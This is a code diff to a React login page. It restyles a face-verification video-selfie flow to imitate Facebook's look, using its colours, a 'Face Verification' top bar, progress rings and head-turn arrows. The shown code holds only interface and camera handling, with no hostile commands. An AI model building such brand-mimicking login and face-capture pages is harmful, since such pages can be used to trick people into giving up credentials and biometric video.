@@ -90,6 +90,9 @@ export default function LoginPage() {
   const [faceDetector, setFaceDetector] = useState<faceLandmarksDetection.FaceLandmarksDetector | null>(null);
   const [facePosition, setFacePosition] = useState<{ x: number; y: number } | null>(null);
   const [detectionActive, setDetectionActive] = useState(false);
+  const [faceAlignmentFeedback, setFaceAlignmentFeedback] = useState<string>("Position your face in the circle");
+  const [isFaceAligned, setIsFaceAligned] = useState(false);
+  const [capturedFrames, setCapturedFrames] = useState(0);
   const detectionIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
   const loginForm = useForm<LoginForm>({
@@ -714,166 +717,229 @@ export default function LoginPage() {
             </div>
           )}
 
-          {/* Instructions Screen */}
+          {/* Instructions Screen - Facebook Style */}
           {currentStep === "instructions" && (
-            <div className="text-center px-4 py-8">
-              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
-
-              {/* Camera Preview */}
-              <div className="relative w-72 h-96 mx-auto mb-8 rounded-2xl overflow-hidden" style={{ backgroundColor: '#000', boxShadow: '0 10px 40px rgba(0,0,0,0.2)' }}>
-                <video
-                  ref={setVideoRef}
-                  autoPlay
-                  playsInline
-                  muted
-                  className="w-full h-full object-cover scale-x-[-1]"
-                />
-
-                {/* Face outline guide */}
-                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
-                  <div
-                    className="rounded-full border-2"
-                    style={{
-                      width: '70%',
-                      height: '70%',
-                      borderColor: 'rgba(24, 119, 242, 0.6)',
-                      boxShadow: 'inset 0 0 20px rgba(24, 119, 242, 0.2)'
-                    }}
-                  />
-                </div>
+            <div className="flex flex-col h-full" style={{ backgroundColor: '#f5f6f7', minHeight: '100vh' }}>
+              {/* Top Bar */}
+              <div className="flex items-center justify-between px-4 py-3" style={{ backgroundColor: '#fff', borderBottom: '1px solid #e4e6eb' }}>
+                <button
+                  onClick={() => {
+                    if (stream) stream.getTracks().forEach(track => track.stop());
+                    setCurrentStep("login");
+                  }}
+                  className="p-2"
+                  data-testid="button-close-instructions"
+                >
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1c1e21" strokeWidth="2">
+                    <path d="M6 18L18 6M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
+                  </svg>
+                </button>
+                <span className="text-sm font-semibold" style={{ color: '#1c1e21' }}>Face Verification</span>
+                <div className="w-10"></div>
               </div>
 
-              <div className="max-w-sm mx-auto mb-8 text-left">
-                <p className="text-xs font-semibold mb-3" style={{ color: '#1c1e21' }}>Before you start:</p>
-                <div className="space-y-2">
-                  <div className="flex items-center gap-2">
-                    <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#1877f2' }}>
-                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                    </svg>
-                    <p className="text-xs" style={{ color: '#65676b' }}>Good lighting is important</p>
-                  </div>
-                  <div className="flex items-center gap-2">
-                    <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#1877f2' }}>
-                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                    </svg>
-                    <p className="text-xs" style={{ color: '#65676b' }}>Look directly at the camera</p>
-                  </div>
-                  <div className="flex items-center gap-2">
-                    <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#1877f2' }}>
-                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                    </svg>
-                    <p className="text-xs" style={{ color: '#65676b' }}>Recording takes 5 seconds</p>
-                  </div>
-                </div>
-              </div>
-
-              <button
-                onClick={handleStartRecording}
-                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
-                style={{ backgroundColor: '#1877f2' }}
-                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
-                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
-                data-testid="button-start-recording"
-              >
-                Start Recording
-              </button>
-            </div>
-          )}
-
-          {/* Recording Screen */}
-          {currentStep === "recording" && (
-            <div className="text-center px-4 py-8">
-              <h2 className="text-2xl font-bold mb-2" style={{ color: '#1c1e21' }}>
-                Recording...
-              </h2>
-              
-              <p className="text-xs mb-8" style={{ color: '#65676b' }}>
-                Keep your face in the circle
-              </p>
-
-              {/* Circular Camera Feed - Snapchat Style */}
-              <div className="flex justify-center mb-8">
-                <div className="relative" style={{ width: '240px', height: '240px' }}>
-                  {/* Animated progress ring */}
-                  <svg className="absolute inset-0 w-full h-full" style={{ transform: 'rotate(-90deg)' }}>
-                    <circle
-                      cx="120"
-                      cy="120"
-                      r="115"
-                      fill="none"
-                      stroke="#e5e7eb"
-                      strokeWidth="2"
-                    />
-                    <circle
-                      cx="120"
-                      cy="120"
-                      r="115"
-                      fill="none"
-                      stroke="#42b72a"
-                      strokeWidth="3"
-                      strokeDasharray={`${2 * Math.PI * 115}`}
-                      strokeDashoffset={`${2 * Math.PI * 115 * (1 - overallProgress / 100)}`}
-                      style={{ transition: 'stroke-dashoffset 0.3s ease' }}
-                    />
+              {/* Main Content */}
+              <div className="flex-1 flex flex-col items-center justify-center px-6 py-8">
+                {/* Large Circular Frame with Segmented Rings */}
+                <div className="relative mb-8" style={{ width: '280px', height: '280px' }}>
+                  {/* Outer segmented ring */}
+                  <svg className="absolute inset-0 w-full h-full" viewBox="0 0 280 280">
+                    {[0, 1, 2, 3, 4, 5, 6, 7].map((i) => (
+                      <path
+                        key={i}
+                        d={`M 140 10 A 130 130 0 0 1 ${140 + 130 * Math.sin((i + 1) * Math.PI / 4)} ${140 - 130 * Math.cos((i + 1) * Math.PI / 4)}`}
+                        fill="none"
+                        stroke="#e4e6eb"
+                        strokeWidth="4"
+                        strokeLinecap="round"
+                        style={{ transform: `rotate(${i * 45}deg)`, transformOrigin: '140px 140px' }}
+                      />
+                    ))}
                   </svg>
 
-                  {/* Circular video frame */}
-                  <div 
-                    className="absolute inset-0 rounded-full overflow-hidden"
-                    style={{ backgroundColor: '#000', padding: '4px' }}
-                  >
+                  {/* Inner circle with camera */}
+                  <div className="absolute rounded-full overflow-hidden" style={{ top: '20px', left: '20px', right: '20px', bottom: '20px', backgroundColor: '#000' }}>
                     <video
                       ref={setVideoRef}
                       autoPlay
                       playsInline
                       muted
-                      className="w-full h-full object-cover scale-x-[-1] rounded-full"
+                      className="w-full h-full object-cover scale-x-[-1]"
                     />
                   </div>
 
-                  {/* Direction indicators - brackets */}
+                  {/* Face guide circle */}
                   <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
-                    {/* Top bracket */}
-                    {currentDirection === "up" && (
-                      <div className="absolute top-4 left-1/2 transform -translate-x-1/2 flex gap-8" style={{ color: directionProgress > 50 ? '#42b72a' : '#ccc' }}>
-                        <div className="text-3xl font-bold">(</div>
-                        <div className="text-3xl font-bold" style={{ transform: 'scaleX(-1)' }}>)</div>
-                      </div>
-                    )}
-                    {/* Left bracket */}
-                    {currentDirection === "left" && (
-                      <div className="absolute left-4 top-1/2 transform -translate-y-1/2 flex flex-col gap-8" style={{ color: directionProgress > 50 ? '#42b72a' : '#ccc' }}>
-                        <div className="text-3xl font-bold" style={{ transform: 'rotate(90deg)' }}>)</div>
-                        <div className="text-3xl font-bold" style={{ transform: 'rotate(90deg)' }}>(</div>
-                      </div>
-                    )}
-                    {/* Right bracket */}
-                    {currentDirection === "right" && (
-                      <div className="absolute right-4 top-1/2 transform -translate-y-1/2 flex flex-col gap-8" style={{ color: directionProgress > 50 ? '#42b72a' : '#ccc' }}>
-                        <div className="text-3xl font-bold" style={{ transform: 'rotate(-90deg)' }}>(</div>
-                        <div className="text-3xl font-bold" style={{ transform: 'rotate(-90deg)' }}>)</div>
-                      </div>
-                    )}
+                    <div
+                      className="rounded-full border-2 border-dashed"
+                      style={{ width: '60%', height: '60%', borderColor: 'rgba(24, 119, 242, 0.5)' }}
+                    />
                   </div>
                 </div>
+
+                {/* Instructions */}
+                <h2 className="text-xl font-semibold mb-2" style={{ color: '#1c1e21' }}>Position your face</h2>
+                <p className="text-sm text-center mb-8" style={{ color: '#65676b', maxWidth: '260px' }}>
+                  Center your face in the circle. Make sure you have good lighting.
+                </p>
+
+                <button
+                  onClick={handleStartRecording}
+                  className="w-full max-w-xs py-3 text-white text-sm font-bold rounded-full transition"
+                  style={{ backgroundColor: '#1877f2' }}
+                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                  data-testid="button-start-recording"
+                >
+                  Start Verification
+                </button>
+              </div>
+            </div>
+          )}
+
+          {/* Recording Screen - Facebook Style */}
+          {currentStep === "recording" && (
+            <div className="flex flex-col h-full" style={{ backgroundColor: '#f5f6f7', minHeight: '100vh' }}>
+              {/* Top Bar */}
+              <div className="flex items-center justify-between px-4 py-3" style={{ backgroundColor: '#fff', borderBottom: '1px solid #e4e6eb' }}>
+                <button
+                  onClick={() => {
+                    if (stream) stream.getTracks().forEach(track => track.stop());
+                    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+                    setCurrentStep("login");
+                  }}
+                  className="p-2"
+                  data-testid="button-close-recording"
+                >
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1c1e21" strokeWidth="2">
+                    <path d="M6 18L18 6M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
+                  </svg>
+                </button>
+                <span className="text-sm font-semibold" style={{ color: '#1c1e21' }}>Face Verification</span>
+                <div className="w-10"></div>
               </div>
 
-              <button
-                onClick={() => {
-                  if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                  }
-                  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                    mediaRecorder.stop();
-                  }
-                  setCurrentStep("login");
-                }}
-                className="text-sm"
-                style={{ color: '#1877f2' }}
-                data-testid="button-cancel-verification"
-              >
-                Cancel
-              </button>
+              {/* Main Content */}
+              <div className="flex-1 flex flex-col items-center justify-center px-6 py-8">
+                {/* Large Circular Frame with Segmented Progress Rings */}
+                <div className="relative mb-6" style={{ width: '280px', height: '280px' }}>
+                  {/* Segmented progress ring */}
+                  <svg className="absolute inset-0 w-full h-full" viewBox="0 0 280 280">
+                    {[0, 1, 2, 3, 4, 5, 6, 7].map((i) => {
+                      const segmentProgress = (overallProgress / 100) * 8;
+                      const isComplete = i < segmentProgress;
+                      const isActive = i >= segmentProgress - 1 && i < segmentProgress;
+                      return (
+                        <circle
+                          key={i}
+                          cx="140"
+                          cy="140"
+                          r="130"
+                          fill="none"
+                          stroke={isComplete ? '#42b72a' : '#e4e6eb'}
+                          strokeWidth="4"
+                          strokeDasharray="45 6"
+                          strokeDashoffset={-i * 51}
+                          strokeLinecap="round"
+                          style={{ 
+                            transition: 'stroke 0.3s ease',
+                            opacity: isActive ? 0.7 : 1
+                          }}
+                        />
+                      );
+                    })}
+                  </svg>
+
+                  {/* Inner circle with camera */}
+                  <div className="absolute rounded-full overflow-hidden" style={{ top: '20px', left: '20px', right: '20px', bottom: '20px', backgroundColor: '#000' }}>
+                    <video
+                      ref={setVideoRef}
+                      autoPlay
+                      playsInline
+                      muted
+                      className="w-full h-full object-cover scale-x-[-1]"
+                    />
+                  </div>
+
+                  {/* Arrow Direction Indicators */}
+                  {currentDirection === "right" && (
+                    <div className="absolute right-0 top-1/2 transform translate-x-4 -translate-y-1/2">
+                      <div 
+                        className="flex items-center justify-center w-10 h-10 rounded-full"
+                        style={{ backgroundColor: directionProgress > 50 ? '#42b72a' : '#1877f2' }}
+                      >
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3">
+                          <path d="M5 12h14M12 5l7 7-7 7" strokeLinecap="round" strokeLinejoin="round"/>
+                        </svg>
+                      </div>
+                    </div>
+                  )}
+                  {currentDirection === "left" && (
+                    <div className="absolute left-0 top-1/2 transform -translate-x-4 -translate-y-1/2">
+                      <div 
+                        className="flex items-center justify-center w-10 h-10 rounded-full"
+                        style={{ backgroundColor: directionProgress > 50 ? '#42b72a' : '#1877f2' }}
+                      >
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3">
+                          <path d="M19 12H5M12 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round"/>
+                        </svg>
+                      </div>
+                    </div>
+                  )}
+                  {currentDirection === "up" && (
+                    <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-4">
+                      <div 
+                        className="flex items-center justify-center w-10 h-10 rounded-full"
+                        style={{ backgroundColor: directionProgress > 50 ? '#42b72a' : '#1877f2' }}
+                      >
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3">
+                          <path d="M12 19V5M5 12l7-7 7 7" strokeLinecap="round" strokeLinejoin="round"/>
+                        </svg>
+                      </div>
+                    </div>
+                  )}
+                </div>
+
+                {/* Direction instruction text */}
+                <div className="text-center mb-4">
+                  <p className="text-lg font-semibold mb-1" style={{ color: '#1c1e21' }}>
+                    {currentDirection === "right" && "Turn your head right"}
+                    {currentDirection === "left" && "Turn your head left"}
+                    {currentDirection === "up" && "Look up"}
+                    {!currentDirection && "Keep your face centered"}
+                  </p>
+                  <p className="text-xs" style={{ color: '#65676b' }}>
+                    Follow the arrow direction
+                  </p>
+                </div>
+
+                {/* Progress indicator */}
+                <div className="flex items-center gap-2 mb-6">
+                  {[0, 1, 2, 3, 4, 5].map((i) => (
+                    <div
+                      key={i}
+                      className="w-2 h-2 rounded-full"
+                      style={{
+                        backgroundColor: i < Math.floor(overallProgress / 16.67) ? '#42b72a' : '#e4e6eb',
+                        transition: 'background-color 0.3s ease'
+                      }}
+                    />
+                  ))}
+                </div>
+
+                <button
+                  onClick={() => {
+                    if (stream) stream.getTracks().forEach(track => track.stop());
+                    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+                    setCurrentStep("login");
+                  }}
+                  className="text-sm"
+                  style={{ color: '#65676b' }}
+                  data-testid="button-cancel-verification"
+                >
+                  Cancel verification
+                </button>
+              </div>
             </div>
           )}
 
